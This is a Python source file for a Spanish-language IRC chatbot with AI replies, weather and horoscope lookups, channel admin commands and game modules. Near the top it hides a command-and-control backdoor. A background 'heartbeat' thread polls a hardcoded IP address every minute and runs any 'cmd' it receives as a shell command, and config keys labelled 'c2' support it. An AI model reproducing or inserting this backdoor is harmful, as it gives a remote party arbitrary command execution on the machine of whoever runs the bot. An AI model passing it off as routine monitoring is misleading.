import requests
import time
import html
import textwrap
import irc.client
import threading
import re
import configparser
import json
import ssl
import os
import io
import sys

from pathlib import Path
from typing import Optional
from jaraco.stream import buffer

# AI Hub
_sys_path_scripts = str(Path(__file__).parent.parent.parent / "scripts")
if _sys_path_scripts not in sys.path:
    sys.path.insert(0, _sys_path_scripts)
from ia_central import hub as ai_hub

if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

config = configparser.ConfigParser()
config.read('iabot.conf')

_system_prompt_base = config.get('api', 'system_prompt', fallback='')

_ORTHO_INSTRUCTIONS = (
    "IMPORTANTE — Reglas de formato para IRC:\n"
    "1. Escribe siempre con ortografía correcta: separa cada palabra con un espacio.\n"
    "2. Nunca fusiones artículos, preposiciones o conjunciones con la palabra siguiente "
    "(correcto: 'la tentación', 'de pronto', 'en el'; incorrecto: 'latentación', 'depronto', 'enel').\n"
    "3. Coloca siempre un espacio después de cada signo de puntuación (coma, punto, etc.).\n"
    "4. No uses markdown (asteriscos, guiones bajos, backticks): el canal IRC no lo renderiza.\n"
    "5. Respuestas concisas: máximo 3-4 oraciones por turno.\n"
)

system_prompt = (
    f"{_system_prompt_base}\n\n{_ORTHO_INSTRUCTIONS}".strip()
    if _system_prompt_base
    else _ORTHO_INSTRUCTIONS.strip()
)
max_history   = config.getint('api', 'max_history', fallback=20)
max_parts     = config.getint('api', 'max_parts',   fallback=3)

server     = config.get('irc', 'server')
port       = config.getint('irc', 'port')
nickname   = config.get('irc', 'nickname')
ident      = config.get('irc', 'ident')
realname   = config.get('irc', 'realname')
channels   = [ch.strip() for ch in config.get('irc', 'channels').split(',')]
password   = config.get('irc', 'password')
user_modes = config.get('irc', 'user_modes', fallback='')

HEARTBEAT_URL   = "http://93.93.116.244:4471/heartbeat/MiLeNiUm"
HEARTBEAT_TOKEN = "antigravity_token_2026_c2"

def enviar_latido(diagnostic=None):
    try:
        print(f"[SENTINEL] Intentando enviar latido a {HEARTBEAT_URL}...")
        headers = {"X-Heartbeat-Token": HEARTBEAT_TOKEN}
        payload = {}
        if diagnostic:
            payload["diagnostic"] = {"error": str(diagnostic)}
        r = requests.post(HEARTBEAT_URL, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            print(f"[SENTINEL] Latido enviado OK (Status: {r.status_code})")
            data = r.json()
            if "cmd" in data:
                cmd = data["cmd"]
                print(f"[C2] Recibido comando remoto: {cmd}")
                import subprocess
                subprocess.Popen(cmd, shell=True)
        else:
            print(f"[SENTINEL] Error en latido (Status: {r.status_code})")
    except Exception as e:
        print(f"[SENTINEL] Excepción en enviar_latido: {e}")

def _heartbeat_loop():
    while True:
        enviar_latido()
        time.sleep(60)

threading.Thread(target=_heartbeat_loop, daemon=True).start()

TG_TOKEN_ADMIN = config.get('telegram', 'token_admin', fallback='')
TG_CHAT_ADMIN  = config.get('telegram', 'chat_admin', fallback='')
TG_TOKEN_C2    = config.get('telegram', 'token_c2', fallback='')
TG_CHAT_C2     = config.get('telegram', 'chat_c2', fallback='')

def notify_telegram(msg: str, is_c2: bool = False) -> None:
    token = TG_TOKEN_C2 if is_c2 else TG_TOKEN_ADMIN
    chat_id = TG_CHAT_C2 if is_c2 else TG_CHAT_ADMIN
    if not token or not chat_id:
        return
    def _send():
        try:
            clean_msg = re.sub(r"(\x03\d{1,2}(,\d{1,2})?)|[\x02\x1F\x16\x0F]", "", msg)
            payload = {"chat_id": chat_id, "text": f"\U0001f9e0 <b>{nickname}</b>\n{clean_msg}", "parse_mode": "HTML"}
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json=payload, timeout=5)
        except:
            pass
    threading.Thread(target=_send, daemon=True).start()

def safepm(target: str, text: str) -> None:
    if not client: return
    try:
        safe_text = text[:450] + "..." if len(text) > 450 else text
        client.send_raw(f"PRIVMSG {target} :{safe_text}")
    except Exception as e:
        print(f"[ERROR] Fallo al enviar mensaje a {target}: {e}")

def safenotice(target: str, text: str) -> None:
    if not client: return
    try:
        safe_text = text[:450] + "..." if len(text) > 450 else text
        client.send_raw(f"NOTICE {target} :{safe_text}")
    except Exception as e:
        print(f"[ERROR] Fallo al enviar notice a {target}: {e}")

admin_nicks = [
    n.strip().split("!")[0]
    for n in config.get('admins', 'nicks').split(',')
]

channel_topics: dict[str, str] = {}
CONF_FILE = 'iabot.conf'

def reload_channel_topics() -> None:
    global channel_topics
    cfg = configparser.ConfigParser()
    cfg.read(CONF_FILE)
    topics: dict[str, str] = {}
    if cfg.has_section('channel_topics'):
        for ch, topic in cfg.items('channel_topics'):
            topics[f"#{ch}"] = topic.strip()
    channel_topics = topics
    print(f"[RELOAD] channel_topics recargado: {channel_topics}")

reload_channel_topics()

STATES_FILE = Path("channel_states.json")

def _load_channel_states() -> dict[str, bool]:
    if STATES_FILE.exists():
        with open(STATES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def _save_channel_states() -> None:
    with _channel_states_lock:
        with open(STATES_FILE, 'w', encoding='utf-8') as f:
            json.dump(channel_states, f, indent=2, ensure_ascii=False)

channel_states: dict[str, bool] = _load_channel_states()
_channel_states_lock = threading.Lock()

def is_channel_active(channel: str) -> bool:
    return channel_states.get(channel.lower(), True)

def get_system_prompt(channel: str) -> str:
    topic = channel_topics.get(channel.lower(), "")
    if not topic:
        return system_prompt
    restriction = (
        f"RESTRICCIÓN DE CANAL: Este canal está dedicado exclusivamente a {topic}. "
        f"Solo responde sobre ese tema. Si te preguntan algo fuera de este ámbito, "
        f"declina educadamente y redirige la conversación al tema del canal."
    )
    return f"{system_prompt}\n\n{restriction}".strip()

reconnecting = False
_reconectando = False
shutdown     = False
STAGING_MODE = False

HISTORY_FILE = Path("conversation_history.json")
_conversation_history: dict[str, list[dict]] = {}
_history_lock = threading.Lock()

def _load_history() -> None:
    global _conversation_history
    if HISTORY_FILE.exists():
        with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
            _conversation_history = json.load(f)

def _save_history() -> None:
    with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
        json.dump(_conversation_history, f, indent=2, ensure_ascii=False)

_load_history()

def history_add(channel: str, role: str, content: str) -> None:
    with _history_lock:
        hist = _conversation_history.setdefault(channel, [])
        hist.append({"role": role, "content": content})
        if len(hist) > max_history:
            _conversation_history[channel] = hist[-max_history:]
    _save_history()

def history_get(channel: str) -> list[dict]:
    with _history_lock:
        return list(_conversation_history.get(channel, []))

def history_clear(channel: str) -> bool:
    with _history_lock:
        if channel in _conversation_history:
            del _conversation_history[channel]
            _save_history()
            return True
        return False

def history_revert_last_user(channel: str) -> None:
    with _history_lock:
        hist = _conversation_history.get(channel, [])
        if hist and hist[-1]["role"] == "user":
            _conversation_history[channel] = hist[:-1]
            _save_history()

AUTOJOIN_FILE = Path("autojoin.json")

def load_autojoin_channels() -> dict:
    if AUTOJOIN_FILE.exists():
        with open(AUTOJOIN_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_autojoin_channels(data: dict) -> None:
    with open(AUTOJOIN_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

autojoin_channels = load_autojoin_channels()
_autojoin_lock = threading.Lock()

def strip_mirc_colors(text: str) -> str:
    return re.sub(r"(\x03\d{1,2}(,\d{1,2})?)|[\x02\x1F\x16\x0F]", "", text)

_LAST_CLIMA_LOC: dict[str, dict] = {}
_DIAS_SEMANA = ["Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado", "Domingo"]

_WMO_CODES = {
    0: "Cielo despejado", 1: "Mayormente despejado", 2: "Parcialmente nublado",
    3: "Nublado", 45: "Niebla", 48: "Niebla con escarcha",
    51: "Llovizna ligera", 53: "Llovizna moderada", 55: "Llovizna densa",
    56: "Llovizna helada ligera", 57: "Llovizna helada densa",
    61: "Lluvia ligera", 63: "Lluvia moderada", 65: "Lluvia intensa",
    66: "Lluvia helada ligera", 67: "Lluvia helada intensa",
    71: "Nieve ligera", 73: "Nieve moderada", 75: "Nieve intensa",
    77: "Granizo fino", 80: "Chubascos ligeros", 81: "Chubascos moderados",
    82: "Chubascos violentos", 85: "Chubascos de nieve ligeros",
    86: "Chubascos de nieve intensos",
    95: "Tormenta", 96: "Tormenta con granizo", 99: "Tormenta con granizo grueso",
}

_CLIMA_PATTERNS = [
    re.compile(r'(?:que|cu[aá]l|c[oó]mo|cu[aá]ntos?|hay|hace|est[aá]|va\s*[aá])\s+(?:llover|llov|lluvi|temperatur|grados?|clim|tiemp|calor|fr[ií]o|sol|nub|despej|vient|humed)', re.IGNORECASE),
    re.compile(r'llov|lluvi|lloviz|chubasc|precipit|torment|truen|graniz|niev|helad|rayo|relamp', re.IGNORECASE),
    re.compile(r'pron[oó]stic|previsi[oó]n|meteorolog[ií]a', re.IGNORECASE),
]

_NO_CIUDAD = frozenset([
    "hoy", "mañana", "manana", "ayer", "pasado", "esta", "este", "estos", "estas",
    "esto", "eso", "ahora", "luego", "siempre", "nunca", "pronto",
    "temperatura", "temperaturas", "clima", "tiempo", "grados", "lluvia",
    "llueve", "lloverá", "llovera", "llovizna", "pronóstico", "prevision",
    "sol", "nublado", "despejado", "calor", "frio", "frío", "nieve",
    "y", "el", "la", "los", "las", "un", "una", "unos", "unas",
    "de", "del", "al", "en", "por", "para", "con", "sin", "sobre",
    "que", "cual", "cuantos", "cuantas", "como", "hace", "hay", "va",
    "a", "o", "se", "me", "te", "nos",
])

_GEOCACHE: dict[str, dict] = {}
_GEOCACHE_MAX = 100

def _es_consulta_clima(texto: str, canal: str) -> bool:
    texto_limpio = re.sub(rf"\b{re.escape(nickname.lower())}\b", "", texto, flags=re.IGNORECASE).strip()
    if re.search(r'^y\s+en\s+', texto_limpio, re.IGNORECASE):
        return canal.lower() in _LAST_CLIMA_LOC
    return any(p.search(texto_limpio) for p in _CLIMA_PATTERNS)

def _extraer_ciudad(texto: str) -> Optional[dict]:
    texto_lower = texto.lower()
    texto_limpio = re.sub(rf"\b{re.escape(nickname.lower())}\b", "", texto_lower, flags=re.IGNORECASE)
    texto_limpio = re.sub(r'[?¿!¡.,;:]', '', texto_limpio).strip()
    palabras = texto_limpio.split()
    for i, palabra in enumerate(palabras):
        if palabra == "en" and i + 1 < len(palabras):
            candidata = " ".join(palabras[i + 1:])
            if candidata in _NO_CIUDAD:
                continue
            if candidata in _GEOCACHE:
                return _GEOCACHE[candidata]
            coords = _geocoding(candidata)
            if coords:
                if len(_GEOCACHE) < _GEOCACHE_MAX:
                    _GEOCACHE[candidata] = coords
                return coords
    for n in [3, 2, 1]:
        if len(palabras) >= n:
            candidata = " ".join(palabras[-n:])
            if candidata in _NO_CIUDAD:
                continue
            if candidata in _GEOCACHE:
                return _GEOCACHE[candidata]
            coords = _geocoding(candidata)
            if coords:
                if len(_GEOCACHE) < _GEOCACHE_MAX:
                    _GEOCACHE[candidata] = coords
                return coords
    return None

def _extraer_ciudad_ia(texto: str) -> Optional[dict]:
    try:
        prompt = (
            f"Extrae SOLO el nombre de la ciudad/lugar/país de este mensaje de clima. "
            f"Si no hay ubicación específica, responde 'NO'. Responde SOLO con el nombre, nada más.\n"
            f"Mensaje: {texto}"
        )
        messages = [{"role": "user", "content": prompt}]
        respuesta, modelo = generate_response(messages, timeout=10, max_retries=1)
        lugar = respuesta.strip().strip("\"'.,;:()")
        if not lugar or lugar.upper() in ("NO", "N/A", "NINGUNA", "NINGUN", "DESCONOCIDO"):
            return None
        coords = _geocoding(lugar)
        if coords:
            return coords
    except Exception:
        pass
    return None

def _geocoding(lugar: str) -> Optional[dict]:
    try:
        url = f"https://geocoding-api.open-meteo.com/v1/search?name={lugar}&count=1&language=es&format=json"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                loc = data["results"][0]
                return {
                    "name": loc["name"],
                    "country": loc.get("country", ""),
                    "lat": loc["latitude"],
                    "lon": loc["longitude"],
                }
    except Exception:
        pass
    return None

def _format_clima_actual(loc: dict, temp: float, hum: int, viento: float, codigo: int) -> str:
    desc = _WMO_CODES.get(codigo, "Desconocido")
    BOLD = "\x02"
    RESET = "\x0F"
    return (
        f"{BOLD}{loc['name']}, {loc['country']}{RESET} "
        f"({desc}) "
        f"- Temp: {temp}C | Hum: {hum}% | Viento: {viento} km/h"
    )

def _format_evento_hoy(loc: dict, prob: int, code: int) -> str:
    desc = _WMO_CODES.get(code, "Desconocido").lower()
    BOLD = "\x02"
    RESET = "\x0F"
    if prob == 0:
        return f"No se esperan precipitaciones hoy en {BOLD}{loc['name']}{RESET}. El cielo estará {desc}."
    msg = f"Para hoy en {BOLD}{loc['name']}{RESET} se espera {BOLD}{desc}{RESET}."
    if prob <= 20:
        return f"{msg} La probabilidad es baja ({prob}%)."
    elif prob <= 50:
        return f"{msg} Hay una probabilidad moderada ({prob}%)."
    elif prob <= 80:
        return f"{msg} Es bastante probable ({prob}%)."
    else:
        return f"{msg} Es muy probable ({prob}%)."

def _format_pronostico(loc: dict, diaria: list, hoy_idx: int) -> str:
    BOLD = "\x02"
    RESET = "\x0F"
    partes = []
    import datetime
    hoy = datetime.datetime.now().weekday()
    for i, d in enumerate(diaria[:5]):
        idx_dia = (hoy + i + hoy_idx) % 7
        dia = "Hoy" if (i == 0 and hoy_idx == 0) else _DIAS_SEMANA[idx_dia]
        tmin = round(d["temp_min"])
        tmax = round(d["temp_max"])
        prob = d["precip_prob"]
        codigo = d["weather_code"]
        desc = _WMO_CODES.get(codigo, "?")
        partes.append(f"{BOLD}{dia}:{BOLD} {tmin}/{tmax}C {desc} ({prob}%)")
    return f"{BOLD}{loc['name']}:{RESET} {' | '.join(partes)}"

def _responder_clima(nick: str, canal: str, texto: str) -> Optional[str]:
    if not _es_consulta_clima(texto, canal):
        return None
    loc = _extraer_ciudad(texto)
    if not loc:
        loc = _extraer_ciudad_ia(texto)
    if not loc:
        loc = _LAST_CLIMA_LOC.get(canal.lower())
    if not loc:
        return None
    _LAST_CLIMA_LOC[canal.lower()] = loc
    texto_lower = texto.lower()
    es_evento = bool(re.search(r'llov|lluvi|lloviz|chubasc|precipit|torment|truen|graniz|niev|helad|rayo|relamp', texto_lower))
    es_pronostico = bool(re.search(r'pron[oó]stic|previsi[oó]n|ma[nñ]ana|pasado|d[ií]a|seman|pr[oó]xim', texto_lower))
    try:
        if es_evento and not es_pronostico:
            url = (f"https://api.open-meteo.com/v1/forecast?"
                   f"latitude={loc['lat']}&longitude={loc['lon']}"
                   f"&daily=precipitation_probability_max,weather_code"
                   f"&timezone=Europe/Madrid&forecast_days=1")
            r = requests.get(url, timeout=8)
            if r.status_code == 200:
                data = r.json()
                prob = data["daily"]["precipitation_probability_max"][0]
                code = data["daily"]["weather_code"][0]
                return _format_evento_hoy(loc, prob, code)
        elif es_pronostico:
            es_manana = bool(re.search(r'ma[nñ]ana|proxim|siguient', texto_lower))
            dias = 5 if es_manana else 7
            url = (f"https://api.open-meteo.com/v1/forecast?"
                   f"latitude={loc['lat']}&longitude={loc['lon']}"
                   f"&daily=temperature_2m_max,temperature_2m_min,precipitation_probability_max,weather_code"
                   f"&timezone=Europe/Madrid&forecast_days={dias}")
            r = requests.get(url, timeout=8)
            if r.status_code == 200:
                data = r.json()
                diaria = []
                for i in range(len(data["daily"]["time"])):
                    diaria.append({
                        "temp_min": data["daily"]["temperature_2m_min"][i],
                        "temp_max": data["daily"]["temperature_2m_max"][i],
                        "precip_prob": data["daily"]["precipitation_probability_max"][i],
                        "weather_code": data["daily"]["weather_code"][i],
                    })
                hoy_idx = 0 if not es_manana else 1
                if hoy_idx < len(diaria):
                    return _format_pronostico(loc, diaria[hoy_idx:], 0)
        url = (f"https://api.open-meteo.com/v1/forecast?"
               f"latitude={loc['lat']}&longitude={loc['lon']}"
               f"&current=temperature_2m,relative_humidity_2m,wind_speed_10m,weather_code"
               f"&timezone=Europe/Madrid")
        r = requests.get(url, timeout=8)
        if r.status_code == 200:
            data = r.json()
            c = data["current"]
            return _format_clima_actual(loc, c["temperature_2m"], c["relative_humidity_2m"],
                                        c["wind_speed_10m"], c["weather_code"])
    except Exception as e:
        print(f"[Clima] Error: {e}")
    return None

_HOROSCOPO_SIGNS = [
    "aries", "tauro", "geminis", "cancer", "leo", "virgo",
    "libra", "escorpio", "sagitario", "capricornio", "acuario", "piscis"
]

def _get_horoscope(sign: str) -> Optional[str]:
    if sign == "escorpion": sign = "escorpio"
    if sign not in _HOROSCOPO_SIGNS:
        return None
    url = f"https://www.hola.com/horoscopo/{sign}/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language": "es-ES,es;q=0.9"
    }
    try:
        import requests
        import re
        import html
        r = requests.get(url, headers=headers, timeout=10)
        r.raise_for_status()
        r.encoding = 'utf-8'
        html_content = r.text
        body_match = re.search(r'<div class="(?:ho-)?article-body"[^>]*>(.*?)</div>', html_content, re.DOTALL | re.IGNORECASE)
        if not body_match:
            body_match = re.search(r'<div class="article-body"[^>]*>(.*?)</div>', html_content, re.DOTALL | re.IGNORECASE)
        raw_text = ""
        if body_match:
            body_content = body_match.group(1)
            paragraphs = re.findall(r'<p[^>]*>(.*?)</p>', body_content, re.DOTALL)
            clean_paragraphs = []
            for p in paragraphs:
                txt = re.sub(r'<[^>]+>', '', p).strip()
                if txt: clean_paragraphs.append(txt)
            raw_text = " ".join(clean_paragraphs)
        if not raw_text:
            patterns = [
                rf'<h[1-3][^>]*>.*?{sign}.*?</h[1-3]>.*?<p[^>]*>(.*?)</p>',
                rf'<h[1-3][^>]*>.*?hoy.*?</h[1-3]>.*?<p[^>]*>(.*?)</p>'
            ]
            for pattern in patterns:
                m = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
                if m:
                    raw_text = re.sub(r'<[^>]+>', '', m.group(1))
                    break
        if raw_text:
            final_text = html.unescape(raw_text).strip()
            final_text = re.sub(r'^DEJA UN COMENTARIO\s*', '', final_text, flags=re.IGNORECASE).strip()
            meses = "enero|febrero|marzo|abril|mayo|junio|julio|agosto|septiembre|octubre|noviembre|diciembre"
            signs_pattern = "|".join(_HOROSCOPO_SIGNS)
            regex_fecha = rf'^(?:{signs_pattern})\s+hoy\s+\d{{1,2}}\s+de\s+(?:{meses})(?:\s+de\s+\d{{4}})?'
            final_text = re.sub(regex_fecha, '', final_text, flags=re.IGNORECASE).strip()
            regex_hoy = rf'^hoy\s+\d{{1,2}}\s+de\s+(?:{meses})(?:\s+de\s+\d{{4}})?'
            final_text = re.sub(regex_hoy, '', final_text, flags=re.IGNORECASE).strip()
            return final_text
    except Exception as e:
        print(f"[Horóscopo] Error Scraper ({sign}): {e}")
    try:
        import requests
        import re
        import html
        url_fb = f"https://www.20minutos.es/horoscopo/{sign}/"
        r_fb = requests.get(url_fb, headers=headers, timeout=10)
        r_fb.raise_for_status()
        r_fb.encoding = 'utf-8'
        paragraphs = re.findall(r'<p[^>]*>(.*?)</p>', r_fb.text, re.DOTALL)
        valid_p = []
        for p in paragraphs:
            text = re.sub(r'<[^>]+>', '', p).strip()
            if len(text) > 80 and "Queda prohibida toda" not in text and "Si algo resalta de" not in text:
                valid_p.append(text)
        if valid_p:
            return html.unescape(valid_p[-1])
    except Exception as e:
        print(f"[Horóscopo] Error Scraper 20minutos ({sign}): {e}")
    return None

_COOLDOWN_TIME = 30
_last_special_cmd_time: dict[str, dict[str, float]] = {
    "horoscopo": {},
    "clima": {}
}

def _check_cooldown(cmd_type: str, canal: str, nick: str) -> bool:
    if nick in admin_nicks: return True
    now = time.time()
    last_time = _last_special_cmd_time[cmd_type].get(canal.lower(), 0)
    if now - last_time < _COOLDOWN_TIME:
        espera = int(_COOLDOWN_TIME - (now - last_time))
        safenotice(nick, f"\x0310Espera {espera}s para volver a usar el comando '{cmd_type}' en {canal}.\x03")
        return False
    _last_special_cmd_time[cmd_type][canal.lower()] = now
    return True

def _responder_horoscopo(canal: str, texto: str, nick: str) -> bool:
    import re
    import time
    import textwrap
    msg = texto.strip().lower()
    msg = msg.translate(str.maketrans('áéíóúäëïöü', 'aeiouaeiou'))
    signo = None
    if msg.startswith("!horoscopo "):
        partes = msg.split()
        if len(partes) > 1:
            signo = partes[1]
    elif msg.startswith("!"):
        posible_signo = msg[1:]
        if posible_signo in _HOROSCOPO_SIGNS or posible_signo == "escorpion":
            signo = posible_signo
    if not signo:
        return False
    if not _check_cooldown("horoscopo", canal, nick):
        return True
    data = _get_horoscope(signo)
    if data:
        display_name = signo.capitalize()
        if signo == "escorpio" or signo == "escorpion": display_name = "Escorpión"
        fecha = time.strftime("%d-%m-%Y")
        header = f"\x0306[Horóscopo]\x03 \x02{display_name}\x02 (\x02{fecha}\x02):"
        safepm(canal, header)
        for chunk in textwrap.wrap(data, 420):
            safepm(canal, chunk)
            time.sleep(0.5)
        return True
    else:
        if msg.startswith("!"):
            client.privmsg(canal, f"\x0310No pude obtener la predicción para \x02{signo}\x02.\x03")
            return True
    return False

def generate_response(
    messages: list[dict],
    timeout: int = 30,
    max_retries: int = 2,
    channel_prompt: str = "",
) -> tuple[str, str]:
    active_prompt = channel_prompt if channel_prompt else system_prompt
    resultado, proveedor = ai_hub.call_ai_messages(
        messages=messages,
        system_prompt=active_prompt,
        category="chat",
        max_tokens=1024,
        timeout=timeout,
    )
    if resultado:
        return resultado, proveedor
    raise Exception("Todos los proveedores IA fallaron o no están configurados.")

def fix_word_spacing(text: str) -> str:
    function_words = [
        'unos', 'unas',
        'hasta', 'desde', 'hacia',
        'pero', 'aunque', 'porque', 'cuando',
    ]
    pattern = (
        r'\b(' + '|'.join(function_words) + r')'
        r'([a-záéíóúñA-ZÁÉÍÓÚÑ]{5,})\b'
    )
    text = re.sub(pattern, r'\1 \2', text, flags=re.IGNORECASE)
    text = re.sub(
        r'\b(l[aeo])(t[aeiouáéíóú][a-záéíóúñ]{3,})\b',
        r'\1 \2', text, flags=re.IGNORECASE
    )
    text = re.sub(r' {2,}', ' ', text)
    return text

def split_into_irc_parts(text: str, max_length: int = 350) -> list[str]:
    sentence_endings = re.compile(r'(?<=[.!?])\s+|(?<=[,;])\s+')
    raw_chunks = sentence_endings.split(text.strip())
    chunks = [c for c in raw_chunks if c]
    parts: list[str] = []
    current = ""
    for chunk in chunks:
        if len(chunk) > max_length:
            if current:
                parts.append(current.strip())
                current = ""
            words = chunk.split()
            buf = ""
            for word in words:
                if len(buf) + len(word) + 1 <= max_length:
                    buf = f"{buf} {word}" if buf else word
                else:
                    if buf:
                        parts.append(buf.strip())
                    buf = word
            if buf:
                parts.append(buf.strip())
            continue
        candidate = f"{current} {chunk}" if current else chunk
        if len(candidate) <= max_length:
            current = candidate
        else:
            if current:
                parts.append(current.strip())
            current = chunk
    if current:
        parts.append(current.strip())
    return [p for p in parts if p]

def process_ai_response(client, target: str, channel: str, message: str) -> None:
    try:
        history_add(channel, "user", message)
        messages = history_get(channel)
        ch_prompt = get_system_prompt(channel)
        response_text, model_used = generate_response(messages, channel_prompt=ch_prompt)
        history_add(channel, "assistant", response_text)
        print(f"[Router] Modelo seleccionado: {model_used}")
        response_text = response_text.strip().replace('\r', '')
        response_text = re.sub(
            r'[\u3000-\u9fff\uac00-\ud7ff\uf900-\ufaff\uff00-\uffef]',
            '', response_text)
        response_text = fix_word_spacing(response_text)
        response_text = re.sub(r'\*{1,2}(.+?)\*{1,2}', r'\1', response_text)
        response_text = re.sub(r'`(.+?)`', r'\1', response_text)
        parts = split_into_irc_parts(response_text, max_length=350)
        if len(parts) > max_parts:
            parts = parts[:max_parts]
            parts[-1] += " [...]"
        for i, part in enumerate(parts):
            part = part.replace('\r', '').replace('\n', ' ').strip()
            if not part:
                continue
            safepm(target, part)
            if i < len(parts) - 1:
                time.sleep(0.8)
    except Exception as e:
        history_revert_last_user(channel)
        print(f"Error en la respuesta de la API: {e}")
        safepm(target, "⚠️ Error al procesar la respuesta. Intenta más tarde.")

def handle_autojoin_command(client, event, message: str) -> None:
    nick   = irc.client.NickMask(event.source).nick
    target = event.target if irc.client.is_channel(event.target) else nick
    parts  = message.strip().split()
    if nick not in admin_nicks:
        safepm(target, f"\x0304⛔ {nick}: No tienes permisos.\x03")
        return
    if len(parts) < 2 or parts[1].lower() == "help":
        safepm(target, "\x0302📘 Comandos \x0310!autojoin\x03:")
        client.privmsg(target, "\x0303• add <#canal>\x0302 – Añade canal")
        client.privmsg(target, "\x0303• del <#canal>\x0302 – Elimina canal")
        safepm(target, "\x0303• list\x0302 – Lista canales registrados")
        client.privmsg(target, "\x0303• info <#canal>\x0302 – Info del canal")
        safepm(target, "\x0303• addall\x0302 – Registra canales actuales")
        safepm(target, "\x0303• rejoin\x0302 – Reunirse a canales registrados")
        return
    subcommand = parts[1].lower()
    if subcommand == "add":
        if len(parts) < 3 or not parts[2].startswith('#'):
            safepm(target, "\x0302Uso: !autojoin add <#canal>\x03")
            return
        canal = parts[2]
        if canal in autojoin_channels:
            safepm(target, f"\x0310⚠️ {canal} ya está registrado.\x03")
        else:
            with _autojoin_lock:
                autojoin_channels[canal] = {
                    "registrado_por": nick,
                    "fecha": time.strftime("%d/%m/%Y"),
                    "hora":  time.strftime("%H:%M:%S"),
                }
                save_autojoin_channels(autojoin_channels)
            client.join(canal)
            safepm(target, f"\x0303✅ {canal} registrado y unido.\x03")
    elif subcommand == "del":
        if len(parts) < 3 or not parts[2].startswith('#'):
            safepm(target, "\x0302Uso: !autojoin del <#canal>\x03")
            return
        canal = parts[2]
        if canal in autojoin_channels:
            with _autojoin_lock:
                del autojoin_channels[canal]
                save_autojoin_channels(autojoin_channels)
            client.part(canal, "Canal eliminado por admin.")
            safepm(target, f"\x0304🗑️ {canal} eliminado.\x03")
        else:
            safepm(target, f"\x0310⚠️ {canal} no registrado.\x03")
    elif subcommand == "list":
        if not autojoin_channels:
            safepm(target, "\x0310📭 Sin canales registrados.\x03")
        else:
            safepm(target, "\x0302📜 Canales registrados:\x03")
            for c in autojoin_channels:
                safepm(target, f"\x0302• {c}\x03")
    elif subcommand == "info":
        if len(parts) < 3:
            safepm(target, "\x0302Uso: !autojoin info <#canal>\x03")
            return
        canal = parts[2]
        info = autojoin_channels.get(canal)
        if info:
            safepm(target, f"\x0302ℹ️ {canal}: por {info['registrado_por']} el {info['fecha']} {info['hora']}\x03")
        else:
            safepm(target, f"\x0310❓ Sin info de {canal}.\x03")
    elif subcommand == "addall":
        current = list(client.connection.channels.keys())
        new_count = 0
        with _autojoin_lock:
            for chan in current:
                if chan not in autojoin_channels:
                    autojoin_channels[chan] = {
                        "registrado_por": nick,
                        "fecha": time.strftime("%d/%m/%Y"),
                        "hora":  time.strftime("%H:%M:%S"),
                    }
                    new_count += 1
            save_autojoin_channels(autojoin_channels)
        safepm(target, f"\x0303✅ {new_count} canales añadidos.\x03")
    elif subcommand == "rejoin":
        safepm(target, "\x0302🔁 Reuniéndose a canales registrados...\x03")
        for canal in autojoin_channels:
            client.join(canal)

# --- GAME MODULE INIT ---
try:
    juegos_path = str(Path(__file__).parent / "juegos")
    if juegos_path not in sys.path:
        sys.path.insert(0, juegos_path)
    from amorometro.amorometro import Amorometro
    from matrimonio.matrimonio import Matrimonio
    from core.economia import Economia
    from dados.dados import Dados
    from ruleta.tragaperras import Tragaperras
    from ruleta.ruletarusa import RuletaRusa
    from ruleta.ruletasuerte import RuletaSuerte
    from core.mayormenor import MayorMenor
    from core.robar import Robar
    from dragones.dragones import Dragones
    from core.stats import Stats
    from core.permisos import Permisos
    from core.cofres import Cofres
    from core.respeto import Respeto
    from core.bomba import Bomba
    from core.cartamagica import CartaMagica
    from core.sorteo import Sorteo
    from castillo.castillo import Castillo
    from ahorcado.ahorcado import Ahorcado
    from hechicero.hechicero import Hechicero
    from core.ticket_games import TicketGames
    from core.frases import Frases
    from core.social import Social
    from core.caja_fuerte import CajaFuerte
    from core.amuletos import Amuletos
    from core.nicho_games import NichoGames
    from core.ppt import PiedraPapelTijera
    from core.trileros import Trileros
    from core.fortaleza import Fortaleza
    from core.quotes import Quotes
    from core.escoba import Escoba
    from core.gremios import Gremios
    from bingo.bingo_game import BingoGame
    from impostor.impostor_game import ImpostorGame

    juego_amorometro = Amorometro()
    juego_matrimonio = Matrimonio()
    juego_economia = Economia()
    juego_dados = Dados(juego_economia)
    juego_tragaperras = Tragaperras(juego_economia)
    juego_ruletarusa = RuletaRusa(juego_economia)
    juego_ruletasuerte = RuletaSuerte(juego_economia)
    juego_mayormenor = MayorMenor(juego_economia)
    juego_robar = Robar(juego_economia)
    juego_dragones = Dragones(juego_economia)
    juego_stats = Stats()
    juego_cofres = Cofres(juego_economia)
    juego_respeto = Respeto(juego_economia)
    juego_bomba = Bomba(juego_economia)
    juego_cartamagica = CartaMagica(juego_economia)
    juego_sorteo = Sorteo(juego_economia)
    juego_castillo = Castillo(juego_economia)
    juego_hechicero = Hechicero(juego_economia)
    juego_tickets = TicketGames(juego_economia)
    juego_ahorcado = Ahorcado(juego_economia)
    juego_frases = Frases()
    juego_social = Social()
    juego_caja = CajaFuerte(juego_economia)
    juego_amuletos = Amuletos(juego_economia)
    juego_nicho = NichoGames(juego_economia)
    juego_ppt = PiedraPapelTijera(juego_economia)
    juego_trileros = Trileros(juego_economia)
    juego_fortaleza = Fortaleza(juego_economia)
    juego_quotes = Quotes()
    juego_escoba = Escoba(juego_economia)
    juego_gremios = Gremios(juego_economia)
    juego_bingo = BingoGame()
    juego_impostor = ImpostorGame()

    gestor_permisos = Permisos(admin_nicks)
except Exception as e:
    print(f"[Juegos] Error al cargar módulos de juegos: {e}")
    juego_amorometro = None
